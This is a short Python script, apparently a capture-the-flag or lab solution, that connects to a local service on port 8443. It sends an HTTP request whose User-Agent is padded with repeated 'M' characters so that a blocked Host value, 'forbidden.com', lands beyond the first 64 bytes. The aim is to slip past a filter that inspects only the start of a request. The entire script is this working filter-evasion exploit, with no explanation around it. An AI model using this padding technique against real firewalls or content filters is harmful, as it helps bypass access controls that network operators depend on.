#!/usr/bin/env python3
import socket
import time

def solve():
    host = '127.0.0.1'
    port = 8443
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    request = b"GET / HTTP/1.1\r\n"
    request += b"User-Agent: " + b"M" * 50 + b"\r\n"  
    request += b"Host: forbidden.com\r\n"
    request += b"\r\n"
    
    pos = request.find(b"forbidden.com")
    print(f"forbidden.com at position {pos}")
    
    if pos >= 64:
        print("Good - forbidden.com appears after first 64 bytes")
        sock.send(request)
        response = sock.recv(4096)
        print(response.decode())
    else:
        print(f"Bad - forbidden.com at position {pos}, need more padding")
        request = b"GET / HTTP/1.1\r\n"
        request += b"User-Agent: " + b"M" * 100 + b"\r\n"
        request += b"Host: forbidden.com\r\n"
        request += b"\r\n"
        sock.send(request)
        response = sock.recv(4096)
        print(response.decode())
    
    sock.close()

if __name__ == "__main__":
    solve()